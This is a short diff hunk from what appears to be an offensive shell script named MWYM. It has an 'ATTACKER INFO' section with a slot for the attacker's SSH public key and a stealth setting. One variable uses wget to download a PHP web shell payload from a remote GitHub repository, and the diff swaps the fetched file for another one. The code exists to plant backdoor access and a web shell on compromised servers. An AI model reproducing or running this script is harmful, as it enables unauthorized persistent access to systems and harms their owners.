@@ -9,7 +9,7 @@ echo -e "[INFO] Welcom to MWYM !!!"
 ## ATTACKER INFO
 rsapub="<PUT YOURR id_rsa.pub HERE>"
 stealth=2
-php_shell_exec="$(wget -qO- https://raw.githubusercontent.com/Retr0Kr0dy/MWYM/main/php/Shell_JASPER.php)"
+php_shell_exec="$(wget -qO- https://raw.githubusercontent.com/Retr0Kr0dy/MWYM/main/Collection/Dashboard_GARNET.html)"
 
 
 ## SCRIPT INFO
